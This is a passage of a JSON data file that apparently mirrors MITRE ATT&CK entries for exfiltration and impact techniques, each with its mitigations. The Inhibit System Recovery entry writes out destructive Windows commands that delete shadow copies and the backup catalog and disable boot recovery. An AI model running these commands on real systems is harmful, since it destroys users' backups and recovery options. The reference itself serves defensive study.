          "content": "Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "Data Loss Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Data loss prevention can detect and block sensitive data being uploaded via web browsers."
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP allowlisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Use access control lists on cloud storage systems and objects. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1041",
    "name": "Exfiltration Over C2 Channel",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "Data Loss Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Data loss prevention can detect and block sensitive data being sent over unencrypted protocols."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1011",
    "name": "Exfiltration Over Other Network Medium",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [{ "id": "T1011.001", "name": "Exfiltration Over Bluetooth" }],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel in local computer security settings or by group policy if it is not needed within an environment."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Prevent the creation of new network adapters where possible."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1052",
    "name": "Exfiltration Over Physical Medium",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [{ "id": "T1052.001", "name": "Exfiltration over USB" }],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "Data Loss Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Data loss prevention can detect and block sensitive data being copied to physical mediums."
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable Autorun if it is unnecessary.  Disallow or restrict removable media at an organizational policy level if they are not required for business operations. "
            }
          ]
        ]
      },
      {
        "id": "M1034",
        "name": "Limit Hardware Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the use of USB devices and removable media within a network."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1567",
    "name": "Exfiltration Over Web Service",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [
      { "id": "T1567.001", "name": "Exfiltration to Code Repository" },
      { "id": "T1567.002", "name": "Exfiltration to Cloud Storage" },
      { "id": "T1567.003", "name": "Exfiltration to Text Storage Sites" },
      { "id": "T1567.004", "name": "Exfiltration Over Webhook" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services."
        }
      ],
      [
        {
          "type": "text",
          "content": "Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "Data Loss Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Data loss prevention can be detect and block sensitive data being uploaded to web services via web browsers."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1029",
    "name": "Scheduled Transfer",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability."
        }
      ],
      [
        {
          "type": "text",
          "content": "When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1537",
    "name": "Transfer Data to Cloud Account",
    "tactics": [{ "id": "TA0010", "name": "Exfiltration" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection."
        }
      ],
      [
        {
          "type": "text",
          "content": "A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces."
        }
      ],
      [
        {
          "type": "text",
          "content": "Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Implement network-based filtering restrictions to prohibit data transfers to untrusted VPCs."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider rotating access keys within a certain number of days to reduce the effectiveness of stolen credentials."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit user account and IAM policies to the least privileges required. Consider using temporary credentials for accounts that are only valid for a certain period of time to reduce the effectiveness of compromised accounts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1531",
    "name": "Account Access Removal",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place."
        }
      ],
      [
        { "type": "text", "content": "In Windows, Net utility, " },
        { "type": "code", "content": "Set-LocalUser" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "Set-ADAccountPassword" },
        {
          "type": "text",
          "content": " PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the "
        },
        { "type": "code", "content": "passwd" },
        {
          "type": "text",
          "content": " utility may be used to change passwords. Accounts could also be disabled by Group Policy. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1485",
    "name": "Data Destruction",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as "
        },
        { "type": "code", "content": "del" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "rm" },
        {
          "type": "text",
          "content": " often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data."
        }
      ],
      [
        {
          "type": "text",
          "content": "To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.."
        }
      ],
      [
        {
          "type": "text",
          "content": "In cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "Data Backup",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1486",
    "name": "Data Encrypted for Impact",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted."
        }
      ],
      [
        {
          "type": "text",
          "content": "In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. "
        }
      ],
      [
        {
          "type": "text",
          "content": "To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\")."
        }
      ],
      [
        {
          "type": "text",
          "content": "In cloud environments, storage objects within compromised accounts may also be encrypted."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable cloud-delivered protection and Attack Surface Reduction (ASR) rules to block the execution of files that resemble ransomware. "
            }
          ]
        ]
      },
      {
        "id": "M1053",
        "name": "Data Backup",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing IT disaster recovery plans that contain procedures for regularly taking and testing data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery. Consider enabling versioning in cloud environments to maintain backup copies of storage objects."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1565",
    "name": "Data Manipulation",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [
      { "id": "T1565.001", "name": "Stored Data Manipulation" },
      { "id": "T1565.002", "name": "Transmitted Data Manipulation" },
      { "id": "T1565.003", "name": "Runtime Data Manipulation" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making."
        }
      ],
      [
        {
          "type": "text",
          "content": "The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider encrypting important information to reduce an adversary’s ability to perform tailored data modifications."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Identify critical business and system processes that may be targeted by adversaries and work to isolate and secure those systems against unauthorized access and tampering."
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "Remote Data Storage",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and manipulate backups."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1491",
    "name": "Defacement",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [
      { "id": "T1491.001", "name": "Internal Defacement" },
      { "id": "T1491.002", "name": "External Defacement" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "Data Backup",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1561",
    "name": "Disk Wipe",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [
      { "id": "T1561.001", "name": "Disk Content Wipe" },
      { "id": "T1561.002", "name": "Disk Structure Wipe" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted."
        }
      ],
      [
        {
          "type": "text",
          "content": "To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares."
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as "
        },
        { "type": "code", "content": "erase" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "Data Backup",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1499",
    "name": "Endpoint Denial of Service",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [
      { "id": "T1499.001", "name": "OS Exhaustion Flood" },
      { "id": "T1499.002", "name": "Service Exhaustion Flood" },
      { "id": "T1499.003", "name": "Application Exhaustion Flood" },
      { "id": "T1499.004", "name": "Application or System Exploitation" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion."
        }
      ],
      [
        {
          "type": "text",
          "content": "An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS)."
        }
      ],
      [
        {
          "type": "text",
          "content": "To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices."
        }
      ],
      [
        {
          "type": "text",
          "content": "Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks."
        }
      ],
      [
        {
          "type": "text",
          "content": "In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers."
        }
      ],
      [
        {
          "type": "text",
          "content": "For attacks attempting to saturate the providing network, see Network Denial of Service."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1657",
    "name": "Financial Theft",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware, business email compromise (BEC) and fraud, \"pig butchering,\" bank hacking, and exploiting cryptocurrency networks. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may Compromise Accounts to conduct unauthorized transfers of funds. In the case of business email compromise or email fraud, an adversary may utilize Impersonation of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary. This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft."
        }
      ],
      [
        {
          "type": "text",
          "content": "Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after Data Encrypted for Impact  and Exfiltration of data, followed by threatening public exposure unless payment is made to the adversary."
        }
      ],
      [
        {
          "type": "text",
          "content": "Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as Data Destruction and business disruption."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit access/authority to execute sensitive transactions, and switch to systems and procedures designed to authenticate/approve payments and purchase requests outside of insecure communication lines such as email."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train and test users to identify social engineering techniques used to enable financial theft."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1495",
    "name": "Firmware Corruption",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system. Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards."
        }
      ],
      [
        {
          "type": "text",
          "content": "In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable. Depending on the device, this attack may also result in Data Destruction. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "Boot Integrity",
        "description": [
          [
            {
              "type": "text",
              "content": "Check the integrity of the existing BIOS and device firmware to determine if it is vulnerable to modification."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Prevent adversary access to privileged accounts or access necessary to replace system firmware."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Patch the BIOS and other firmware as necessary to prevent successful use of known vulnerabilities."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1490",
    "name": "Inhibit System Recovery",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options."
        }
      ],
      [
        {
          "type": "text",
          "content": "Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups."
        }
      ],
      [
        {
          "type": "text",
          "content": "A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:"
        }
      ],
      [
        {
          "type": "li",
          "content": "vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet"
        },
        {
          "type": "li",
          "content": "Windows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy delete"
        },
        {
          "type": "li",
          "content": "wbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet"
        },
        {
          "type": "li",
          "content": "bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no"
        },
        {
          "type": "li",
          "content": "REAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system"
        }
      ],
      [
        {
          "type": "text",
          "content": "On network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also delete \"online\" backups that are connected to their network – whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "Data Backup",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery. In cloud environments, enable versioning on storage objects where possible, and copy backups to other accounts or regions to isolate them from the original copies."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. Additionally, ensure that WinRE is enabled using the following command: "
            },
            { "type": "code", "content": "reagentc /enable" },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the user accounts that have access to backups to only those required."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1498",
    "name": "Network Denial of Service",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [
      { "id": "T1498.001", "name": "Direct Network Flood" },
      { "id": "T1498.002", "name": "Reflection Amplification" }
    ],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion."
        }
      ],
      [
        {
          "type": "text",
          "content": "A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS)."
        }
      ],
      [
        {
          "type": "text",
          "content": "To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices."
        }
      ],
      [
        {
          "type": "text",
          "content": "For DoS attacks targeting the hosting system directly, see Endpoint Denial of Service."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations."
            }
          ],
          [
            {
              "type": "text",
              "content": "Depending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport."
            }
          ],
          [
            {
              "type": "text",
              "content": "As immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1496",
    "name": "Resource Hijacking",
    "tactics": [{ "id": "TA0040", "name": "Impact" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. "
        }
      ],
      [
        {
          "type": "text",
